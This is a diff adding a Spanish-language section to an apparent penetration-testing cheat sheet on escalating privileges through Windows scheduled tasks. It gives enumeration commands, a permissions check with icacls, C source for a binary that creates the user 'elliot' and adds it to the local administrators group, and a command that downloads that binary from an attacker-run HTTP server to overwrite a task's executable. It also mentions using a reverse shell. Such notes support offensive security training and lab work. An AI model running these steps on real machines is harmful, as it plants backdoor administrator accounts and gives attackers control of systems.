@@ -1713,6 +1713,53 @@ Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my binary\binary.e
 Start-Service <SERVICE>
 ```
 
+##### Tareas Programadas (Scheduled Tasks)
+
+> Las **Scheduled Tasks** (Tareas Programadas) en Windows son una función del sistema operativo que permite automatizar la ejecución de programas, scripts o comandos en momentos específicos o bajo ciertas condiciones. Estas tareas se pueden configurar para que se ejecuten diariamente, semanalmente, mensualmente, al iniciar el sistema, al iniciar sesión, o incluso cuando ocurren eventos específicos. Son útiles para realizar mantenimiento automático, backups, actualizaciones, o cualquier tarea repetitiva sin necesidad de intervención manual.
+
+```powershell
+# Listar las tareas programadas
+schtasks /query /fo LIST /v
+Get-ScheduleTask
+Get-ScheduledTask | Where-Object { $_.Author -and $_.Author -notmatch 'Microsoft|SYSTEM|S-1-5-18|S-1-5-19|S-1-5-20' } | Select-Object TaskName, Author, @{Name='TaskToRun'; Expression={$_.Actions.Execute}}, NextRunTime
+```
+
+Cuando listamos las tareas programadas deberíamos buscar información interesante, como el autor, el nombre de la tarea, la tarea a ejecutar, el usuario que ejecuta la tarea y la próxima ejecución de la tarea.
+
+Buscamos la ruta de la tarea a ejecutar y comprobamos si tenemos permisos de escritura en esa ruta, para poder remplazar el binario.
+
+```powershell
+icacls C:\Ruta\Al\Binario\<BINARY>.exe
+```
+
+Creamos un binario para remplazarlo. Reutilizamos el binario `adduser.exe` el cual crea y agrega un nuevo usuario a grupo administrador (esto depende del usuario que este ejecutando la tarea) o también podemos lanzarnos una reverse shell.
+
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user elliot Password123! /add");
+  i = system ("net localgroup administrators elliot /add");
+  
+  return 0;
+}
+```
+
+Creamos un servidor HTTP con Python y transferimos el binario a la máquina víctima.
+
+```powershell
+iwr -Uri http://192.168.56.5/adduser.exe -Outfile <BINARY>.exe
+```
+
+Movemos el binario a la ruta del binario original para remplazarlo.
+
+```powershell
+move .\<BINARY>.exe C:\Ruta\Al\Binario\
+```
+
 ###  9.2. <a name='linux-2'></a>Linux
 
 ##  10. <a name='active-directory'></a>Active Directory
